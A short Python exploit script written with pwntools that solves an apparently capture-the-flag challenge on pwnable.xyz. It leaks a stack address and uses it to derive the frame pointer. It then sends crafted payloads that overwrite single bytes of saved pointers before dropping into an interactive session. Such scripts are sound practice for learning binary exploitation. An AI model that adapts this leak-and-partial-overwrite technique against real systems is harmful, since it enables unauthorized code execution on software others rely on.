from pwn import *

r = remote('svc.pwnable.xyz',30012)
#r = process('./challenge')
#r = gdb.debug('./challenge', gdbscript='disas read_int8')

r.sendlineafter(b'> ', b'3')
a = r.recvline().strip()
rbp = int(a,16) - 248 #Locally the next difference worked (0xf18-0xdf0). Remotely needed 248 :()
print(hex(rbp))
relocation_byte = (rbp + 9) % 256

payload = b'120' + b'\x00' + b'0'*28 + relocation_byte.to_bytes(1,'little')
r.sendafter(b'> ', payload)

pay = b'0'*32 + (rbp % 256).to_bytes(1,'little')
r.sendafter(b'> ', pay)
r.sendafter(b'> ', b'1')

r.interactive()
